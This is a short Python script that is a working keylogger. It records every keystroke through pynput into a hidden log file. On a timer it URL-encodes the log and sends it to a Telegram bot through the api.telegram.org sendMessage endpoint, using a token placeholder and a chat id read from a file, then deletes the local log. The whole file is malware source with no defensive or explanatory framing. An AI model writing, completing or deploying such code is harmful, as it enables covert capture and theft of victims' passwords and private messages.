import os
from time import sleep
from pynput.keyboard import Listener as KeyboardListener
from urllib.parse import quote
import requests

import urllib3

TOKEN = 'YOUR_TOKEN_HERE'
set_timer = int(open("assets/.timer", "r", encoding="utf-8").read())
time = 0
log_file = "assets/.log"



def on_key_press(key):
    with open(log_file, "a", encoding="utf-8") as file:
        try:
            file.write(key.char)
        except:
            if key.name == "space":
                file.write(" ")
            if(key.name == "enter" or key.name == "tab"):
              file.write("\n")

        file.close()

keyboard_listener = KeyboardListener(on_press=on_key_press)

keyboard_listener.start()

while True:
    if(time >= (set_timer * 60)):
        id = open("assets/receptor.txt", "r").read()
        try:
            log = open(log_file, "r", encoding="utf-8")
        except:
            open(log_file, "w", encoding="utf-8")
            log = open(log_file, "r", encoding="utf-8")
        log_send = log.read()
        if(log_send != ""):
            log_send = quote(log_send)
            receptor = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={log_send}"
            requests.get(receptor)
            log.close()
            if os.path.exists(log_file):
                os.remove(log_file)
                file = open(log_file, "w")
                file.close()
            
        time = 0    
    sleep(1)
    time = time + 1